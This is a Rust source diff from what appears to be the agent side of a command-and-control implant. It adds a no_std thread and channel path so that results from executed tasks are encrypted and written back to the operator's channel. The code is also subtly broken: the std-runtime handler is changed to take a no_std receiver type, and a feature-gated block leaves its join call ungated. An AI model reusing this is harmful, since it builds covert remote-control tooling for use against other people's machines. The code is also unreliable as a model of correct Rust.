@@ -2,6 +2,7 @@ use core::ffi::c_void;
 
 use alloc::sync::Arc;
 
+use mod_nostd::{nostd_mpsc, nostd_thread};
 use rs2_runtime::Runtime;
 
 use rs2_communication_protocol::communication_structs::agent_commands::AgentCommands;
@@ -49,6 +50,11 @@ where
         #[cfg(feature = "std-runtime")]
         let (result_tx, result_rx) = mpsc::channel::<TaskOutput>();
         #[cfg(feature = "std-runtime")]
+        let result_handler_handle = result_handler(rt.clone(), result_rx);
+
+        #[cfg(feature = "nostd-nt-runtime")]
+        let (result_tx, result_rx) = nostd_mpsc::channel::<TaskOutput>();
+        #[cfg(feature = "nostd-nt-runtime")]
         let result_handler_handle = result_handler(rt.clone(), result_rx);
 
         #[cfg(any(feature = "protocol-json", feature = "protocol-winhttp"))]
@@ -121,17 +127,50 @@ where
             drop(result_tx); // Close the result channel, indicating no more tasks will send results.
             result_handler_handle.join().unwrap(); // Wait for the result handler to finish processing all results.
         });
+
+        #[cfg(feature = "nostd-nt-runtime")]
+        drop(result_tx); // Close the result channel, indicating no more tasks will send results.
+        result_handler_handle.join().unwrap(); // Wait for the result handler to finish processing all results.
     }
 }
 
-pub fn result_handler<R>(rt: Arc<R>, result_rx: mpsc::Receiver<TaskOutput>) -> JoinHandle<()>
+#[cfg(feature = "std-runtime")]
+pub fn result_handler<R>(rt: Arc<R>, result_rx: nostd_mpsc::Receiver<TaskOutput>) -> JoinHandle<()>
 where
     R: Runtime,
 {
-    #[cfg(feature = "std-runtime")]
     // Spawn a separate thread to handle and process the results.
     thread::spawn(move || {
         while let Ok(result) = result_rx.recv() {
+            // Create a new reference to protocol inside the loop
+            let protocol = unsafe { protocol_from_raw(instance().session.protocol_ptr) };
+            let encryptor = unsafe { encryptor_from_raw(instance().session.encryptor_ptr) };
+
+            // Block on the async write operation using the runtime's block_on method
+            rt.block_on(async move {
+                protocol
+                    .write(result.clone(), Some(encryptor.clone()))
+                    .await
+                    .unwrap();
+            });
+
+            // println!("Result {}: {:?}", i, result);
+        }
+    })
+}
+
+#[cfg(feature = "nostd-nt-runtime")]
+pub fn result_handler<R>(
+    rt: Arc<R>,
+    result_rx: nostd_mpsc::Receiver<TaskOutput>,
+) -> nostd_thread::NoStdThread
+where
+    R: Runtime,
+{
+    // Spawn a separate thread to handle and process the results.
+
+    nostd_thread::NoStdThread::spawn(move || {
+        while let Some(result) = result_rx.recv() {
             // Create a new reference to protocol inside the loop
             let protocol = unsafe { protocol_from_raw(instance().session.protocol_ptr) };
             let encryptor = unsafe { encryptor_from_raw(instance().session.encryptor_ptr) };
